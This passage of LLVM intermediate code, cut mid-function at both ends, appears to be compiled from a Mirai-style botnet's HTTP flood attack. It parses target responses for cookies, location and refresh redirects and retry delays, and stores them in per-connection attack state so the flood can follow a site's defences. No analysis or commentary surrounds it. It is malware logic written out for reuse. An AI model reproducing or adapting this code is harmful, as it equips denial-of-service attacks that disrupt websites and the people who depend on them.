  %446 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 11
  store i32 2, i32* %446, align 4
  br label %447

; <label>:447:                                    ; preds = %439, %445
  %448 = call i8* @table_retrieve_val(i32 45, i32* null)
  %449 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %448) #9
  %450 = icmp eq i32 %449, -1
  br i1 %450, label %453, label %451

; <label>:451:                                    ; preds = %447
  %452 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 11
  store i32 1, i32* %452, align 4
  br label %453

; <label>:453:                                    ; preds = %447, %451
  %454 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 12
  store i32 0, i32* %454, align 4
  %455 = call i8* @table_retrieve_val(i32 44, i32* null)
  %456 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %455) #9
  %457 = icmp eq i32 %456, -1
  br i1 %457, label %482, label %458

; <label>:458:                                    ; preds = %453
  %459 = call i8* @table_retrieve_val(i32 44, i32* null)
  %460 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %459) #9
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %461
  %463 = load i8, i8* %462, align 1
  %464 = icmp eq i8 %463, 32
  %465 = zext i1 %464 to i32
  %.575 = add nsw i32 %465, %460
  %466 = sext i32 %.575 to i64
  %467 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %466
  %468 = sub nsw i32 %430, %.575
  %469 = call i32 @util_memsearch(i8* %467, i32 %468, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %470 = icmp eq i32 %469, -1
  br i1 %470, label %482, label %471

; <label>:471:                                    ; preds = %458
  %472 = icmp sgt i32 %469, 1
  %473 = add nsw i32 %469, -2
  %.576 = select i1 %472, i32 %473, i32 %469
  %474 = add nsw i32 %.575, %.576
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %475
  store i8 0, i8* %476, align 1
  %477 = call i32 @util_strlen(i8* %467) #9
  %478 = call i8* @table_retrieve_val(i32 43, i32* null)
  %479 = call i32 @util_stristr(i8* %467, i32 %477, i8* %478) #9
  %480 = icmp eq i32 %479, 0
  br i1 %480, label %482, label %481

; <label>:481:                                    ; preds = %471
  store i32 1, i32* %454, align 4
  br label %482

; <label>:482:                                    ; preds = %471, %458, %453, %481
  %483 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 13
  store i32 0, i32* %483, align 4
  %484 = call i8* @table_retrieve_val(i32 41, i32* null)
  %485 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %484) #9
  %486 = icmp eq i32 %485, -1
  br i1 %486, label %511, label %487

; <label>:487:                                    ; preds = %482
  %488 = call i8* @table_retrieve_val(i32 41, i32* null)
  %489 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %488) #9
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %490
  %492 = load i8, i8* %491, align 1
  %493 = icmp eq i8 %492, 32
  %494 = zext i1 %493 to i32
  %.577 = add nsw i32 %494, %489
  %495 = sext i32 %.577 to i64
  %496 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %495
  %497 = sub nsw i32 %430, %.577
  %498 = call i32 @util_memsearch(i8* %496, i32 %497, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %499 = icmp eq i32 %498, -1
  br i1 %499, label %511, label %500

; <label>:500:                                    ; preds = %487
  %501 = icmp sgt i32 %498, 1
  %502 = add nsw i32 %498, -2
  %.578 = select i1 %501, i32 %502, i32 %498
  %503 = add nsw i32 %.577, %.578
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %504
  store i8 0, i8* %505, align 1
  %506 = call i32 @util_strlen(i8* %496) #9
  %507 = call i8* @table_retrieve_val(i32 42, i32* null)
  %508 = call i32 @util_stristr(i8* %496, i32 %506, i8* %507) #9
  %509 = icmp eq i32 %508, 0
  br i1 %509, label %511, label %510

; <label>:510:                                    ; preds = %500
  store i32 1, i32* %483, align 4
  br label %511

; <label>:511:                                    ; preds = %500, %487, %482, %510
  %512 = call i8* @table_retrieve_val(i32 40, i32* null)
  %513 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %512) #9
  %514 = icmp eq i32 %513, -1
  br i1 %514, label %.sink.split, label %515

; <label>:515:                                    ; preds = %511
  %516 = call i8* @table_retrieve_val(i32 40, i32* null)
  %517 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %516) #9
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %518
  %520 = load i8, i8* %519, align 1
  %521 = icmp eq i8 %520, 32
  %522 = zext i1 %521 to i32
  %.579 = add nsw i32 %522, %517
  %523 = sext i32 %.579 to i64
  %524 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %523
  %525 = sub nsw i32 %430, %.579
  %526 = call i32 @util_memsearch(i8* %524, i32 %525, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %527 = icmp eq i32 %526, -1
  br i1 %527, label %.preheader609, label %528

; <label>:528:                                    ; preds = %515
  %529 = icmp sgt i32 %526, 1
  %530 = add nsw i32 %526, -2
  %.580 = select i1 %529, i32 %530, i32 %526
  %531 = add nsw i32 %.579, %.580
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %532
  store i8 0, i8* %533, align 1
  %534 = call i32 @util_atoi(i8* %524, i32 10) #9
  br label %.sink.split

.sink.split:                                      ; preds = %511, %528
  %.sink6 = phi i32 [ %534, %528 ], [ 0, %511 ]
  %535 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 14
  store i32 %.sink6, i32* %535, align 4
  br label %.preheader609

.preheader609:                                    ; preds = %515, %.sink.split
  %536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 15
  %537 = call i8* @table_retrieve_val(i32 39, i32* null)
  %538 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %537) #9
  %539 = icmp eq i32 %538, -1
  br i1 %539, label %.critedge581, label %.lr.ph645.preheader

.lr.ph645.preheader:                              ; preds = %.preheader609
  br label %.lr.ph645

.lr.ph645:                                        ; preds = %.lr.ph645.preheader, %.loopexit
  %540 = phi i8* [ %.pre689, %.loopexit ], [ %21, %.lr.ph645.preheader ]
  %.0559644 = phi i32 [ %.pre686, %.loopexit ], [ 0, %.lr.ph645.preheader ]
  %541 = load i32, i32* %536, align 4
  %542 = icmp slt i32 %541, 5
  br i1 %542, label %543, label %.critedge581.loopexit

; <label>:543:                                    ; preds = %.lr.ph645
  %544 = call i8* @table_retrieve_val(i32 39, i32* null)
  %545 = call i32 @util_stristr(i8* %540, i32 %430, i8* %544) #9
  %546 = add nsw i32 %545, %.0559644
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %547
  %549 = load i8, i8* %548, align 1
  %550 = icmp eq i8 %549, 32
  %551 = zext i1 %550 to i32
  %.582 = add nsw i32 %551, %545
  %552 = sext i32 %.582 to i64
  %553 = getelementptr inbounds i8, i8* %540, i64 %552
  %554 = sub nsw i32 %430, %.0559644
  %555 = sub i32 %554, %.582
  %556 = call i32 @util_memsearch(i8* %553, i32 %555, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %557 = icmp eq i32 %556, -1
  %.pre686 = add nsw i32 %.582, %.0559644
  %.pre687 = sext i32 %.pre686 to i64
  %.pre689 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %.pre687
  br i1 %557, label %.loopexit, label %558

; <label>:558:                                    ; preds = %543
  %559 = icmp sgt i32 %556, 1
  %560 = add nsw i32 %556, -2
  %.583 = select i1 %559, i32 %560, i32 %556
  %561 = call i32 @util_memsearch(i8* %553, i32 %555, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %562 = icmp sgt i32 %561, 0
  %563 = add nsw i32 %561, -1
  %..583 = select i1 %562, i32 %563, i32 %.583
  %564 = add nsw i32 %..583, %.pre686
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %565
  store i8 0, i8* %566, align 1
  store i32 0, i32* %5, align 4
  %567 = call i32 @util_strlen(i8* nonnull %.pre689) #9
  %568 = icmp sgt i32 %567, 0
  br i1 %568, label %.lr.ph639.preheader, label %._crit_edge640

.lr.ph639.preheader:                              ; preds = %558
  br label %.lr.ph639

; <label>:569:                                    ; preds = %.lr.ph639
  store i32 %577, i32* %5, align 4
  %570 = call i32 @util_strlen(i8* nonnull %.pre689) #9
  %571 = icmp slt i32 %577, %570
  br i1 %571, label %.lr.ph639, label %._crit_edge640.loopexit

.lr.ph639:                                        ; preds = %.lr.ph639.preheader, %569
  %572 = load i32, i32* %5, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds i8, i8* %.pre689, i64 %573
  %575 = load i8, i8* %574, align 1
  %576 = icmp eq i8 %575, 61
  %577 = add nsw i32 %572, 1
  br i1 %576, label %._crit_edge640.loopexit, label %569

._crit_edge640.loopexit:                          ; preds = %.lr.ph639, %569
  br label %._crit_edge640

._crit_edge640:                                   ; preds = %._crit_edge640.loopexit, %558
  %578 = load i32, i32* %5, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds i8, i8* %.pre689, i64 %579
  %581 = load i8, i8* %580, align 1
  %582 = icmp eq i8 %581, 61
  br i1 %582, label %.preheader, label %.loopexit

.preheader:                                       ; preds = %._crit_edge640
  store i32 0, i32* %5, align 4
  %583 = load i32, i32* %536, align 4
  %584 = icmp sgt i32 %583, 0
  br i1 %584, label %.lr.ph643.preheader, label %.critedge584

.lr.ph643.preheader:                              ; preds = %.preheader
  br label %.lr.ph643

.lr.ph643:                                        ; preds = %.lr.ph643.preheader, %589
  %storemerge567642 = phi i32 [ %591, %589 ], [ 0, %.lr.ph643.preheader ]
  %585 = sext i32 %storemerge567642 to i64
  %586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %585, i64 0
  %587 = call signext i8 @util_strncmp(i8* %.pre689, i8* %586, i32 %578) #9
  %588 = icmp eq i8 %587, 0
  br i1 %588, label %589, label %.loopexit.loopexit

; <label>:589:                                    ; preds = %.lr.ph643
  %590 = load i32, i32* %5, align 4
  %591 = add nsw i32 %590, 1
  store i32 %591, i32* %5, align 4
  %592 = load i32, i32* %536, align 4
  %593 = icmp slt i32 %591, %592
  br i1 %593, label %.lr.ph643, label %.critedge584.loopexit

.critedge584.loopexit:                            ; preds = %589
  br label %.critedge584

.critedge584:                                     ; preds = %.critedge584.loopexit, %.preheader
  %594 = call i32 @util_strlen(i8* %.pre689) #9
  %595 = icmp slt i32 %594, 128
  br i1 %595, label %596, label %.loopexit

; <label>:596:                                    ; preds = %.critedge584
  %597 = load i32, i32* %536, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %598, i64 0
  %600 = call i32 @util_strcpy(i8* %599, i8* %.pre689) #9
  %601 = load i32, i32* %536, align 4
  %602 = add nsw i32 %601, 1
  store i32 %602, i32* %536, align 4
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph643
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %543, %._crit_edge640, %.critedge584, %596
  %603 = call i8* @table_retrieve_val(i32 39, i32* null)
  %604 = call i32 @util_stristr(i8* %.pre689, i32 %430, i8* %603) #9
  %605 = icmp eq i32 %604, -1
  br i1 %605, label %.critedge581.loopexit, label %.lr.ph645

.critedge581.loopexit:                            ; preds = %.loopexit, %.lr.ph645
  br label %.critedge581

.critedge581:                                     ; preds = %.critedge581.loopexit, %.preheader609
  %606 = call i8* @table_retrieve_val(i32 38, i32* null)
  %607 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %606) #9
  %608 = icmp eq i32 %607, -1
  br i1 %608, label %701, label %609

; <label>:609:                                    ; preds = %.critedge581
  %610 = call i8* @table_retrieve_val(i32 38, i32* null)
  %611 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %610) #9
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %612
  %614 = load i8, i8* %613, align 1
  %615 = icmp eq i8 %614, 32
  %616 = zext i1 %615 to i32
  %.585 = add nsw i32 %616, %611
  %617 = sext i32 %.585 to i64
  %618 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %617
  %619 = sub nsw i32 %430, %.585
  %620 = call i32 @util_memsearch(i8* %618, i32 %619, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %621 = icmp eq i32 %620, -1
  br i1 %621, label %701, label %622

; <label>:622:                                    ; preds = %609
  %623 = icmp sgt i32 %620, 1
  %624 = add nsw i32 %620, -2
  %.586 = select i1 %623, i32 %624, i32 %620
  %625 = add nsw i32 %.585, %.586
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %626
  store i8 0, i8* %627, align 1
  %628 = add nsw i32 %.586, 1
  %629 = call i32 @util_memsearch(i8* %618, i32 %628, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4)
  %630 = icmp eq i32 %629, 4
  br i1 %630, label %631, label %676

; <label>:631:                                    ; preds = %622
  %632 = getelementptr inbounds i8, i8* %618, i64 4
  %633 = load i8, i8* %632, align 1
  %634 = icmp eq i8 %633, 115
  %.587 = select i1 %634, i32 8, i32 7
  store i32 %.587, i32* %5, align 4
  %635 = zext i32 %.587 to i64
  %636 = getelementptr inbounds i8, i8* %618, i64 %635
  %637 = sub nsw i32 %628, %.587
  %638 = sext i32 %637 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %618, i8* %636, i64 %638, i32 1, i1 false)
  br label %639

; <label>:639:                                    ; preds = %644, %631
  %indvars.iv673 = phi i64 [ %indvars.iv.next674, %644 ], [ 0, %631 ]
  %640 = getelementptr inbounds i8, i8* %618, i64 %indvars.iv673
  %641 = load i8, i8* %640, align 1
  switch i8 %641, label %644 [
    i8 0, label %.loopexit608
    i8 47, label %642
  ]

; <label>:642:                                    ; preds = %639
  %643 = trunc i64 %indvars.iv673 to i32
  store i32 %643, i32* %5, align 4
  store i8 0, i8* %640, align 1
  br label %646

; <label>:644:                                    ; preds = %639
  %indvars.iv.next674 = add nuw i64 %indvars.iv673, 1
  br label %639

.loopexit608:                                     ; preds = %639
  %645 = trunc i64 %indvars.iv673 to i32
  store i32 %645, i32* %5, align 4
  br label %646

; <label>:646:                                    ; preds = %.loopexit608, %642
  %647 = call i32 @util_strlen(i8* nonnull %618) #9
  %648 = icmp sgt i32 %647, 0
  br i1 %648, label %649, label %655

; <label>:649:                                    ; preds = %646
  %650 = call i32 @util_strlen(i8* nonnull %618) #9
  %651 = icmp slt i32 %650, 128
  br i1 %651, label %652, label %655

; <label>:652:                                    ; preds = %649
  %653 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 7, i64 0
  %654 = call i32 @util_strcpy(i8* %653, i8* nonnull %618) #9
  br label %655

; <label>:655:                                    ; preds = %652, %649, %646
  %656 = load i32, i32* %5, align 4
  %657 = add nsw i32 %656, 1
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds i8, i8* %618, i64 %658
  %660 = call i32 @util_strlen(i8* %659) #9
  %661 = icmp slt i32 %660, 256
  br i1 %661, label %662, label %700

; <label>:662:                                    ; preds = %655
  %663 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 6, i64 1
  call void @util_zero(i8* %663, i32 255) #9
  %664 = load i32, i32* %5, align 4
  %665 = add nsw i32 %664, 1
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds i8, i8* %618, i64 %666
  %668 = call i32 @util_strlen(i8* %667) #9
  %669 = icmp sgt i32 %668, 0
  br i1 %669, label %670, label %700

; <label>:670:                                    ; preds = %662
  %671 = load i32, i32* %5, align 4
  %672 = add nsw i32 %671, 1
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds i8, i8* %618, i64 %673
  %675 = call i32 @util_strcpy(i8* %663, i8* %674) #9
  br label %700

; <label>:676:                                    ; preds = %622
  %677 = load i8, i8* %618, align 1
  %678 = icmp eq i8 %677, 47
  br i1 %678, label %679, label %700

; <label>:679:                                    ; preds = %676
  %680 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 6, i64 1
  call void @util_zero(i8* %680, i32 255) #9
  %681 = load i32, i32* %5, align 4
  %682 = add nsw i32 %681, 1
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds i8, i8* %618, i64 %683
  %685 = call i32 @util_strlen(i8* %684) #9
  %686 = icmp sgt i32 %685, 0
  br i1 %686, label %687, label %700

; <label>:687:                                    ; preds = %679
  %688 = load i32, i32* %5, align 4
  %689 = add nsw i32 %688, 1
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds i8, i8* %618, i64 %690
  %692 = call i32 @util_strlen(i8* %691) #9
  %693 = icmp slt i32 %692, 256
  br i1 %693, label %694, label %700

; <label>:694:                                    ; preds = %687
  %695 = load i32, i32* %5, align 4
  %696 = add nsw i32 %695, 1
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds i8, i8* %618, i64 %697
  %699 = call i32 @util_strcpy(i8* %680, i8* %698) #9
  br label %700

; <label>:700:                                    ; preds = %676, %694, %687, %679, %655, %670, %662
  store i8 1, i8* %417, align 4
  br label %.loopexit611

; <label>:701:                                    ; preds = %609, %.critedge581
  %702 = call i8* @table_retrieve_val(i32 37, i32* null)
  %703 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %702) #9
  %704 = icmp eq i32 %703, -1
  br i1 %704, label %864, label %705

; <label>:705:                                    ; preds = %701
  %706 = call i8* @table_retrieve_val(i32 37, i32* null)
  %707 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %706) #9
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %708
  %710 = load i8, i8* %709, align 1
  %711 = icmp eq i8 %710, 32
  %712 = zext i1 %711 to i32
  %.588 = add nsw i32 %712, %707
  %713 = sext i32 %.588 to i64
  %714 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %713
  %715 = sub nsw i32 %430, %.588
  %716 = call i32 @util_memsearch(i8* %714, i32 %715, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %717 = icmp eq i32 %716, -1
  br i1 %717, label %864, label %718

; <label>:718:                                    ; preds = %705
  %719 = icmp sgt i32 %716, 1
  %720 = add nsw i32 %716, -2
  %.589 = select i1 %719, i32 %720, i32 %716
  %721 = add nsw i32 %.588, %.589
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %722
  store i8 0, i8* %723, align 1
  br label %724

; <label>:724:                                    ; preds = %724, %718
  %indvars.iv675 = phi i64 [ %indvars.iv.next676, %724 ], [ 0, %718 ]
  %725 = getelementptr inbounds i8, i8* %714, i64 %indvars.iv675
  %726 = load i8, i8* %725, align 1
  %.off605 = add i8 %726, -48
  %727 = icmp ult i8 %.off605, 10
  %indvars.iv.next676 = add nuw i64 %indvars.iv675, 1
  br i1 %727, label %724, label %.critedge

.critedge:                                        ; preds = %724
  %728 = add nsw i32 %.589, 1
  %729 = trunc i64 %indvars.iv675 to i32
  store i32 %729, i32* %5, align 4
  %730 = icmp eq i8 %726, 0
  br i1 %730, label %864, label %731

; <label>:731:                                    ; preds = %.critedge
  store i8 0, i8* %725, align 1
  %732 = add nsw i32 %729, 1
  store i32 %732, i32* %5, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8, i8* %714, i64 %733
  %735 = load i8, i8* %734, align 1
  %736 = icmp eq i8 %735, 32
  br i1 %736, label %737, label %739

; <label>:737:                                    ; preds = %731
  %738 = add nsw i32 %729, 2
  store i32 %738, i32* %5, align 4
  br label %739

; <label>:739:                                    ; preds = %737, %731
  %740 = phi i32 [ %738, %737 ], [ %732, %731 ]
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds i8, i8* %714, i64 %741
  %743 = call i32 @util_strlen(i8* %742) #9
  %744 = call i32 @util_stristr(i8* %742, i32 %743, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #9
  %745 = icmp eq i32 %744, -1
  %.pre685 = load i32, i32* %5, align 4
  br i1 %745, label %._crit_edge684, label %746

; <label>:746:                                    ; preds = %739
  %747 = sext i32 %.pre685 to i64
  %748 = getelementptr inbounds i8, i8* %714, i64 %747
  %749 = call i32 @util_strlen(i8* %748) #9
  %750 = call i32 @util_stristr(i8* %748, i32 %749, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #9
  %751 = load i32, i32* %5, align 4
  %752 = add nsw i32 %751, %750
  store i32 %752, i32* %5, align 4
  br label %._crit_edge684

._crit_edge684:                                   ; preds = %739, %746
  %753 = phi i32 [ %752, %746 ], [ %.pre685, %739 ]
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds i8, i8* %714, i64 %754
  %756 = load i8, i8* %755, align 1
  %757 = icmp eq i8 %756, 34
  br i1 %757, label %758, label %776

; <label>:758:                                    ; preds = %._crit_edge684
  %759 = add nsw i32 %753, 1
  store i32 %759, i32* %5, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds i8, i8* %714, i64 %760
  %762 = call i32 @util_strlen(i8* %761) #9
  %763 = add nsw i32 %762, -1
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds i8, i8* %761, i64 %764
  %766 = load i8, i8* %765, align 1
  %767 = icmp eq i8 %766, 34
  br i1 %767, label %768, label %776

; <label>:768:                                    ; preds = %758
  %769 = load i32, i32* %5, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds i8, i8* %714, i64 %770
  %772 = call i32 @util_strlen(i8* %771) #9
  %773 = add nsw i32 %772, -1
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds i8, i8* %771, i64 %774
  store i8 0, i8* %775, align 1
  br label %776

; <label>:776:                                    ; preds = %758, %768, %._crit_edge684
  %777 = call i32 @util_atoi(i8* nonnull %714, i32 10) #9
  %778 = add i32 %777, %379
  %779 = zext i32 %778 to i64
  %.off = add i32 %777, -1
  %780 = icmp ult i32 %.off, 9
  br i1 %780, label %.lr.ph649.split.us.preheader, label %.critedge12

.lr.ph649.split.us.preheader:                     ; preds = %776
  %781 = call i64 @time(i64* null) #9
  %782 = icmp sgt i64 %779, %781
  br i1 %782, label %.lr.ph649.split.us.preheader726, label %.critedge12

.lr.ph649.split.us.preheader726:                  ; preds = %.lr.ph649.split.us.preheader
  br label %.lr.ph649.split.us

.lr.ph649.split.us:                               ; preds = %.lr.ph649.split.us.preheader726, %.lr.ph649.split.us
  %783 = call i32 @sleep(i32 1) #9
  %784 = call i64 @time(i64* null) #9
  %785 = icmp sgt i64 %779, %784
  br i1 %785, label %.lr.ph649.split.us, label %.critedge12.loopexit

.critedge12.loopexit:                             ; preds = %.lr.ph649.split.us
  br label %.critedge12

.critedge12:                                      ; preds = %.critedge12.loopexit, %.lr.ph649.split.us.preheader, %776
  %786 = load i32, i32* %5, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds i8, i8* %714, i64 %787
  %789 = call i32 @util_strlen(i8* %788) #9
  %790 = call i32 @util_stristr(i8* %788, i32 %789, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0)) #9
  %791 = icmp eq i32 %790, 4
  br i1 %791, label %792, label %837

; <label>:792:                                    ; preds = %.critedge12
  %793 = getelementptr inbounds i8, i8* %788, i64 4
  %794 = load i8, i8* %793, align 1
  %795 = icmp eq i8 %794, 115
  %.592 = select i1 %795, i32 8, i32 7
  store i32 %.592, i32* %5, align 4
  %796 = zext i32 %.592 to i64
  %797 = getelementptr inbounds i8, i8* %788, i64 %796
  %798 = sub i32 %728, %.592
  %799 = sext i32 %798 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %788, i8* %797, i64 %799, i32 1, i1 false)
  br label %800

; <label>:800:                                    ; preds = %805, %792
  %indvars.iv677 = phi i64 [ %indvars.iv.next678, %805 ], [ 0, %792 ]
  %801 = getelementptr inbounds i8, i8* %788, i64 %indvars.iv677
  %802 = load i8, i8* %801, align 1
  switch i8 %802, label %805 [
    i8 0, label %.loopexit607
    i8 47, label %803
  ]

; <label>:803:                                    ; preds = %800
  %804 = trunc i64 %indvars.iv677 to i32
  store i32 %804, i32* %5, align 4
  store i8 0, i8* %801, align 1
  br label %807

; <label>:805:                                    ; preds = %800
  %indvars.iv.next678 = add nuw i64 %indvars.iv677, 1
  br label %800

.loopexit607:                                     ; preds = %800
  %806 = trunc i64 %indvars.iv677 to i32
  store i32 %806, i32* %5, align 4
  br label %807

; <label>:807:                                    ; preds = %.loopexit607, %803
  %808 = call i32 @util_strlen(i8* nonnull %788) #9
  %809 = icmp sgt i32 %808, 0
  br i1 %809, label %810, label %816

; <label>:810:                                    ; preds = %807
  %811 = call i32 @util_strlen(i8* nonnull %788) #9
  %812 = icmp slt i32 %811, 128
  br i1 %812, label %813, label %816

; <label>:813:                                    ; preds = %810
  %814 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 7, i64 0
  %815 = call i32 @util_strcpy(i8* %814, i8* nonnull %788) #9
  br label %816

; <label>:816:                                    ; preds = %813, %810, %807
  %817 = load i32, i32* %5, align 4
  %818 = add nsw i32 %817, 1
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds i8, i8* %788, i64 %819
  %821 = call i32 @util_strlen(i8* %820) #9
  %822 = icmp slt i32 %821, 256
  br i1 %822, label %823, label %861

; <label>:823:                                    ; preds = %816
  %824 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 6, i64 1
  call void @util_zero(i8* %824, i32 255) #9
  %825 = load i32, i32* %5, align 4
  %826 = add nsw i32 %825, 1
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds i8, i8* %788, i64 %827
  %829 = call i32 @util_strlen(i8* %828) #9
  %830 = icmp sgt i32 %829, 0
  br i1 %830, label %831, label %861

; <label>:831:                                    ; preds = %823
  %832 = load i32, i32* %5, align 4
  %833 = add nsw i32 %832, 1
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds i8, i8* %788, i64 %834
  %836 = call i32 @util_strcpy(i8* %824, i8* %835) #9
  br label %861

; <label>:837:                                    ; preds = %.critedge12
  %838 = load i8, i8* %788, align 1
  %839 = icmp eq i8 %838, 47
  br i1 %839, label %840, label %861

; <label>:840:                                    ; preds = %837
  %841 = load i32, i32* %5, align 4
  %842 = add nsw i32 %841, 1
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds i8, i8* %788, i64 %843
  %845 = call i32 @util_strlen(i8* %844) #9
  %846 = icmp slt i32 %845, 256
  br i1 %846, label %847, label %861

; <label>:847:                                    ; preds = %840
  %848 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 6, i64 1
  call void @util_zero(i8* %848, i32 255) #9
  %849 = load i32, i32* %5, align 4
  %850 = add nsw i32 %849, 1
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds i8, i8* %788, i64 %851
  %853 = call i32 @util_strlen(i8* %852) #9
  %854 = icmp sgt i32 %853, 0
  br i1 %854, label %855, label %861

; <label>:855:                                    ; preds = %847
  %856 = load i32, i32* %5, align 4
  %857 = add nsw i32 %856, 1
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds i8, i8* %788, i64 %858
  %860 = call i32 @util_strcpy(i8* %848, i8* %859) #9
  br label %861

; <label>:861:                                    ; preds = %837, %847, %855, %840, %816, %831, %823
  %862 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 9, i64 0
  %863 = bitcast i8* %862 to i32*
  store i32 5522759, i32* %863, align 1
  store i8 10, i8* %417, align 4
  br label %.loopexit611

; <label>:864:                                    ; preds = %.critedge, %705, %701
  %865 = call i32 @util_memsearch(i8* nonnull %21, i32 %430, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %866 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 9, i64 0
  %867 = call signext i8 @util_strcmp(i8* %866, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0)) #9
